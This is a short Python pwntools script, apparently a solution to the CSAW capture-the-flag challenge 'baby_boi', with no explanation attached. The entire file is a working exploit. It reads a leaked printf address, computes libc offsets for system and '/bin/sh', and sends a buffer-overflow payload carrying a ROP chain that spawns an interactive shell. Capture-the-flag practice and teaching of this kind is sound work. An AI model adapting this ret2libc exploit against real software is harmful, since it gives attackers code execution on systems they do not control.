from pwn import *
import re


binary = ELF("baby_boi")
rop = ROP(binary)
# p = pwn.tubes.remote.remote("pwn.chal.csaw.io", 1005)
printf_offset = 0x00055750
system_offset_from_printf = - 57088
binsh_offset = 0x186cee

p = process(["./baby_boi"], shell=True)
print(f"PID: {p.proc.pid}")

prompt = p.read()
match = re.search(b'(0x[a-zA-Z0-9]+)', prompt)
leaked_addr = int(match.groups()[0].decode(), 16)
print(hex(leaked_addr))
base = leaked_addr - printf_offset
binsh_addr = base + binsh_offset
system_addr = leaked_addr + system_offset_from_printf
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
payload = ("D"*32).encode() + ("B"*8).encode()
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
p.sendline(payload)
p.interactive()
p.close()

